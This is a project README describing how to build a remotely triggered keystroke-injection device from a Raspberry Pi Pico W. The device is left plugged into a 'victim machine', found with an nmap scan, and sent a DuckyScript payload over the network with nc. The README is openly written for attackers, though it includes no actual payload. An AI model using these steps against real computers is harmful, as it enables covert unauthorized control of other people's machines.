# Remote HID Attack with Raspberry Pi Pico W
With the Raspberry Pi Pico W we can execute HID attacks remotely.

The provided code makes our microcontroller connect to Wi-FI and wait for the payload to execute. In this way, as attackers, we can trigger the attack without the need to be present. We will simply have to leave the device connected to the victim machine and when the user turns it on we will have remote control over it.

## Note
This project is based on a fantastic project called [pico-ducky](https://github.com/dbisu/pico-ducky). I followed the steps and adapted it to be able to add the remote control.

To better understand the previous project, I recommend that you watch the [NetworkChuck](https://www.youtube.com/watch?v=e_f9p-_JWZw) video and try to follow the steps.

Throughout this document the new steps to follow will be explained.

## Setup
1. Download [CircuitPython for the Raspberry Pi Pico W](https://circuitpython.org/board/raspberry_pi_pico_w/). *Updated to 8.0.0
2. Plug the device into a USB port while holding the boot button. It will show up as a removable media device named `RPI-RP2`.
3. Copy the downloaded `.uf2` file to the root of the Pico (`RPI-RP2`). The device will reboot and after a second or so, it will reconnect as `CIRCUITPY`.
4. Download [adafruit-circuitpython-bundle-8.x-mpy-YYYYMMDD.zip](https://github.com/adafruit/Adafruit_CircuitPython_Bundle/releases/latest) and extract it outside the device.
5. Navigate to `lib` in the recently extracted folder and copy `adafruit_hid` to the `lib` folder on your Raspberry Pi Pico W.
6. Copy `adafruit_debouncer.mpy` and `adafruit_ticks.mpy` to the `lib` folder on your Raspberry Pi Pico W.
7. Copy `asyncio` to the `lib` folder on your Raspberry Pico W.
8. Download `code.py` from this repo and copy it as `code.py` in the root of the Raspberry Pi Pico W, overwriting the previous file.
9. Download `user_settings.py` from this repo and and modify the value of the variables.
10. Once modified copy it as `user_settings.py` in the root of the Raspberry Pi Pico W.

## Exploitation
If the previous steps have been followed correctly at this point we have a device that, once connected to our victim machine, will connect to the indicated Wi-Fi and will be waiting for the payload at the port also indicated.

Now we must discover the IP provided to our Raspberry. To do this, from the attacking machine we launch an Nmap in search of the computers with our active port (I recommend using a rare port to avoid noise).

`nmap <network> -Pn -n -p <port> --open`
  
Example: nmap 192.168.0.0/24 -Pn -n -p 7374 --open

Once we have the IP we will [write our payload](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript) in a file and we will only have to send it with Netat:

`nc <ip> <port> < <payload file>`

Example: nc 192.168.0.26 7374 < payload.txt

## Changing Keyboard Layouts
[Neradoc/Circuitpython_Keyboard_Layouts](https://github.com/Neradoc/Circuitpython_Keyboard_Layouts/blob/main/PICODUCKY.md) 

Default: US
